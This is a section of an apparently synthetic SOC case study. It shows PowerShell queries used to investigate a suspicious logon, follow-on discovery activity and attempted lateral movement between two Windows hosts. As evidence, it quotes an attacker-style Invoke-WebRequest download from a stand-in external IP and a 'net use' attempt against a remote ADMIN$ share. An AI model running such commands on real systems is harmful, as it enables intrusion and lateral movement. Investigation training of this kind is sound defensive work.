# CLI Investigation

## Purpose

This section documents the command-line investigation used to validate and expand the initial alert involving sarnold and IT-LT-017.

The objective is not to collect everything available from the endpoint. It is to answer a small number of useful questions with the least amount of noise:

1. What happened around the suspicious authentication?
2. What processes ran after the successful logon?
3. Did PowerShell initiate activity that does not fit normal help desk work?
4. What network connections were associated with the session?
5. Did the activity extend to another internal system?

The commands below represent targeted analyst queries. Repetitive collection and correlation are addressed later in the automation section.

---

## Investigation Window

The suspicious authentication sequence begins at 06:47 and the attempted access to IT-WS-031 occurs shortly after 07:00.

A narrow initial investigation window keeps the first pass manageable.

```powershell
$Start = Get-Date "2026-08-17 06:45:00"
$End   = Get-Date "2026-08-17 07:05:00"
```

This twenty-minute window captures the activity immediately before the failed authentication sequence through the attempted lateral movement.

The window can be expanded later if the evidence supports it.

---

## 1. Review Authentication Events

The first query validates the authentication sequence directly from the Windows Security log.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4624,4625
    StartTime = $Start
    EndTime   = $End
}
```

This confirms that successful and failed authentication events exist during the expected period.

The first pass can then be narrowed to the affected account.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4624,4625
    StartTime = $Start
    EndTime   = $End
} |
Where-Object { $_.Message -match 'sarnold' } |
Select-Object TimeCreated, Id, Message
```

### Analyst Question

Does the raw event sequence match the SIEM alert?

Expected result:

- five failed logons
- same account
- same source system
- successful authentication shortly afterward

At this point the alert is validated, but compromise is not established.

---

## 2. Review Process Creation

The investigation next pivots to Event 4688 process creation activity following the successful logon at 06:50:54.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = $Start
    EndTime   = $End
} |
Select-Object TimeCreated, Id, Message
```

The output can be narrowed to processes relevant to the investigation.

```powershell
$Processes = 'powershell.exe|whoami.exe|hostname.exe|ipconfig.exe|net.exe|nltest.exe|cmd.exe|ping.exe|arp.exe'

Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = $Start
    EndTime   = $End
} |
Where-Object { $_.Message -match $Processes } |
Select-Object TimeCreated, Message
```

### Analyst Question

What user-driven activity occurred immediately after authentication?

The relevant sequence identifies:

- PowerShell execution
- current-user discovery
- hostname discovery
- network configuration review
- domain account queries
- domain trust discovery
- network resource discovery

None of these commands is independently malicious.

That matters because sarnold is a help desk technician and could reasonably use all of them.

The investigation therefore continues.

---

## 3. Inspect PowerShell Activity

Once PowerShell becomes relevant, the analyst should determine what was launched and whether the observed behavior still fits normal administrative work.

A running process can be inspected directly when the session is still active.

```powershell
Get-Process -Name powershell -ErrorAction SilentlyContinue |
Select-Object Id, ProcessName, StartTime
```

For richer process information:

```powershell
Get-CimInstance Win32_Process |
Where-Object { $_.Name -eq 'powershell.exe' } |
Select-Object ProcessId, ParentProcessId, CommandLine
```

The investigation identifies the PowerShell activity associated with the unusual outbound request:

```text
powershell.exe -NoProfile -Command Invoke-WebRequest -UseBasicParsing https://198.51.100.42/status -OutFile C:\Users\Public\Documents\status.txt
```

This changes the context of the session.

PowerShell use remains legitimate in principle, but an unexplained external request immediately following system and domain discovery requires validation.

---

## 4. Review Active TCP Connections

The next pivot is network activity.

```powershell
Get-NetTCPConnection |
Where-Object { $_.State -eq 'Established' } |
Select-Object LocalAddress,
              LocalPort,
              RemoteAddress,
              RemotePort,
              OwningProcess
```

This shows active TCP sessions but does not immediately identify the application by name.

The owning PID can be correlated back to a process.

```powershell
Get-NetTCPConnection |
Where-Object { $_.State -eq 'Established' } |
ForEach-Object {
    $Process = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue

    [PSCustomObject]@{
        LocalAddress  = $_.LocalAddress
        LocalPort     = $_.LocalPort
        RemoteAddress = $_.RemoteAddress
        RemotePort    = $_.RemotePort
        PID           = $_.OwningProcess
        Process       = $Process.ProcessName
    }
}
```

This form is more useful to the analyst because it joins the network connection to the process responsible for it.

### Analyst Question

Which application initiated the unusual HTTPS connection?

Relevant result:

```text
Process        powershell
RemoteAddress  198.51.100.42
RemotePort     443
```

The port itself is not the finding.

The important detail is the association between the destination and PowerShell.

---

## 5. Validate the Destination

The analyst can test whether the address has an associated DNS record.

```powershell
Resolve-DnsName 198.51.100.42 -ErrorAction SilentlyContinue
```

For this synthetic case, 198.51.100.42 is part of address space reserved for documentation and does not represent a live threat infrastructure host.

In a production investigation, the destination would also be checked against:

- internal allowlists
- threat intelligence
- proxy history
- DNS history
- previous endpoint connections
- approved administrative services

The destination should not be labeled malicious solely because it is unfamiliar.

---

## 6. Review Local Network Context

After the external connection, activity shifts toward internal discovery.

Current addressing:

```powershell
Get-NetIPConfiguration
```

ARP / neighbor information:

```powershell
Get-NetNeighbor |
Where-Object { $_.State -ne 'Unreachable' } |
Select-Object IPAddress, LinkLayerAddress, State
```

Routing information:

```powershell
Get-NetRoute |
Where-Object { $_.DestinationPrefix -ne '0.0.0.0/0' } |
Select-Object DestinationPrefix, NextHop, InterfaceAlias
```

These commands establish what the host can currently see from its network position.

They also provide context for the subsequent attention directed toward IT-WS-031.

---

## 7. Validate the Second Host

The process evidence shows a reachability test against IT-WS-031.

A basic connectivity check can be performed with:

```powershell
Test-Connection IT-WS-031 -Count 2
```

The analyst can then test whether SMB is reachable without attempting authentication.

```powershell
Test-NetConnection IT-WS-031 -Port 445
```

This answers two separate questions:

- is the host reachable?
- is SMB exposed between the systems?

A successful TCP test does not establish compromise. It only confirms that the service can be reached from IT-LT-017.

---

## 8. Review SMB Activity

The evidence shows the following command during the suspicious session:

```text
net view \\IT-WS-031
```

followed by:

```text
net use \\IT-WS-031\ADMIN$ /user:NPS\sarnold
```

This is a significant change in context.

The first command queries resources on another endpoint.

The second attempts access to the remote administrative share using the affected account.

The investigation should now pivot back to authentication telemetry rather than repeatedly testing the remote system.

---

## 9. Correlate Remote Authentication

The analyst reviews Event 4625 activity associated with IT-WS-031.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4625
    StartTime = $Start
    EndTime   = $End
} |
Where-Object {
    $_.Message -match 'sarnold' -and
    $_.Message -match 'IT-WS-031'
} |
Select-Object TimeCreated, Id, Message
```

Expected events occur at approximately:

```text
07:02:17
07:02:34
```

Both attempts fail.

This is an important boundary in the investigation.

The evidence supports attempted lateral movement, but it does not support successful compromise of IT-WS-031.

The distinction should remain explicit in the final disposition.

---

## 10. Check Current User and Session Context

If the system remains available during investigation, current interactive users can be reviewed.

```powershell
Get-CimInstance Win32_LoggedOnUser
```

A faster native check is also available:

```text
query user
```

This can help establish whether an active session remains on IT-LT-017.

It does not establish who physically operated the device.

That question remains outside what endpoint telemetry alone can prove.

---

## 11. Review Basic Host Identity

A small number of native commands remain useful for quick validation:

```text
whoami
hostname
ipconfig /all
systeminfo
```

These are intentionally basic.

A SOC analyst should not need a script for every question. Sometimes the shortest reliable command is the right tool.

The important point is knowing what question the command answers and whether the result changes the investigation.

---

## 12. Build a Focused Event View

Once the investigation has identified the relevant event IDs, a compact view is more useful than repeatedly reviewing full event messages.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4624,4625,4688
    StartTime = $Start
    EndTime   = $End
} |
Sort-Object TimeCreated |
Select-Object TimeCreated, Id, ProviderName
```

This gives the analyst a chronological security-event backbone that can be compared against endpoint and firewall telemetry.

At this point, the major sequence should be visible without searching the full dataset repeatedly.

---

## CLI Findings

The command-line review confirms several facts:

- the SIEM authentication alert is supported by Windows event telemetry
- sarnold successfully authenticated after five failed attempts
- PowerShell launched shortly after the successful login
- native Windows utilities were used for system, domain, and network discovery
- PowerShell initiated an unusual outbound HTTPS connection
- activity subsequently shifted toward IT-WS-031
- SMB connectivity existed between the endpoints
- an ADMIN$ authentication attempt was made using sarnold
- the corresponding remote authentication attempts failed
- no successful secondary authentication is present in the available evidence

The CLI investigation therefore supports escalation beyond a simple authentication anomaly.

---

## What the CLI Review Does Not Establish

The investigation does not establish:

- who physically operated IT-LT-017
- how the sarnold credentials were obtained
- whether the external destination delivered malicious content
- whether activity occurred before the available investigation window
- whether additional systems were targeted outside the collected evidence
- whether IT-WS-031 was successfully compromised by another method

Those gaps should remain gaps unless another evidence source resolves them.

---

## Manual Investigation vs. Automation

The commands in this section are intentionally targeted and relatively simple.

They demonstrate the manual pivots an analyst can use to move from an authentication alert into process, endpoint, and network evidence.

Several steps are repetitive:

- defining time windows
- filtering Event 4624 and 4625 activity
- identifying process creation
- joining network connections to owning processes
- searching for related activity involving the same account
- building a chronological event view

Those are good automation candidates.

The automation section will convert the repetitive parts of this workflow into reusable PowerShell tooling while keeping the investigation logic visible.

Automation should make the analyst faster.

It should not hide how the conclusion was reached.
